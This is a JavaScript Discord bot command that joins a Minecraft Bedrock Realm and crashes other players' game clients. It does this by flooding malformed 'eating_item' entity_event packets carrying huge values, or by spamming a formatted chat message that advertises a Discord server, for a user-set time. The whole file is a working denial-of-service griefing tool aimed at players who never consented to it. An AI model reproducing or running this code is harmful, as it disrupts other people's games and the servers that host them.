const Command = require("../_/Command.js");

const RealmApi = require('../../Classes/Realm.js')
const Client = require('../../Classes/Client.js')

class CrashPlayers extends Command {
    subCommand = "crash";
    linkOnly = true;

    constructor() {
        super("players", "Crash everyone inside of a bot's render, works for everyone.", [
            ...require('../../Data/InputBlock.json'),
            {
                name: "type",
                description: "The type to use, all produce same output.",
                type: 4,
                required: true,
                choices: [
                    { name: "T1 [c]", value: 1 },
                    { name: "T2 (laggy) [c]", value: 2 },
                    { name: "T3 [c]", value: 3 }
                ]
            },
            {
                type: 4,
                name: "time",
                description: "Time in seconds to perform action for!",
                required: true,
                min_value: 15,
                max_value: 400
            }
        ]);
    }

    /**
     * @param {import("discord.js").CommandInteraction} interaction
     * @param {{ components: import("../../Classes/DiscordJS/Component.js") }} helpers
     */
    async execute(interaction, { components, args }) {
        const { input, type, time } = args;
        Object.assign(this, { interaction, components });

        await interaction.deferReply({ flags: this.flags });

        if (this.maps.inGame.has(interaction.user.id))
            return this.fastReply("Already in game.", "You are already doing a in-game command, please wait for it to finish before doing another one.");
        this.maps.inGame.set(interaction.user.id, { type: "crashPlayers", input, stage: "testingRealm", client: null });

        try {
            const realmApi = new RealmApi(interaction.dbUser);
            await realmApi.init();

            let realm = /^\d+$/.test(input)
                ? await realmApi.getRealmInfoByID(input, true)
                : await realmApi.getRealmInfo(input, false, true);

            if (realm?.errorMsg) return this.invalidApiResponse(realm, input);

            let host = await realmApi.getRealmIP(realm?.id, true);
            if (host?.errorMsg) return this.invalidApiResponse(host, input);
            realm.address = host.address;

            const client = new Client(realmApi, realm, interaction.dbUser);
            if (this.maps.inGame.get(interaction.user.id).disconnect)
                client.destroyClient('User requested close before client connection.', 'fastClose');

            this.maps.inGame.get(interaction.user.id).client = client;

            client.timeouts.push(setTimeout(() => {
                client.destroyClient("Client timeout, Client -> Server closed.", "connectionVoided")
                this.maps.inGame.delete(interaction.user.id)
            },
                5 * 60000));

            client.on('start_game', async () => {
                components
                    .reset()
                    .separator()
                    .text(
                        `### Crashing ${type === 3 ? `Every User` : `Nearby Users`}.\n` +
                        `-# perxa has connected to **${realm.name}** *(${realm.id})*, and has started to attempt to crash everyone nearby, please note that **[nyx](https://discord.com/channels/1539384072848150609/1554971578788221050)** ` +
                        `and other clients may block some of these crash methods, on top of that private proxy's may also block some methods.\n\n` +
                        `-# ***disconnecting <t:${Math.floor(Date.now() / 1000) + time}:R>!***`
                    )
                    .separator();

                await interaction.editReply({ components, flags: this.flags });

                switch (type) {
                    case 1:
                        client.intervals.push(setInterval(() => {
                            client.write(`entity_event`, {
                                runtime_entity_id: client.runtime, event_id: "eating_item",
                                data: ~~(Math.random() * (30000000 - 15000000 + 1)) + 15000000
                            })
                        }, 15));
                        break;
                    case 2:
                        client.intervals.push(setInterval(() => {
                            client.write(`entity_event`, {
                                runtime_entity_id: client.runtime, event_id: "eating_item",
                                data: 15000000
                            }, 0, 0, 850)
                        }, 65));
                        break;
                    case 3:
                        client.intervals.push(setInterval(() =>
                            client.sendCommand(`me §fmake me §d§l§iblush §r§f:3\n§r${"".repeat(120)}\n§f§ldiscord.gg/§dnethernet :)`, "automationplayer", 10, 2),
                            25));
                        break;
                }

                client.timeouts.push(setTimeout(() => client.destroyClient("Client time reached, perxa closed connection.", "defaultClose"), time * 1000))
            });

            client.once('clientClosed', async ({ reason }) => this.closedComponent(realm, reason, client));
        } catch (error) {
            console.error(error);
        }
    }
}

module.exports = CrashPlayers;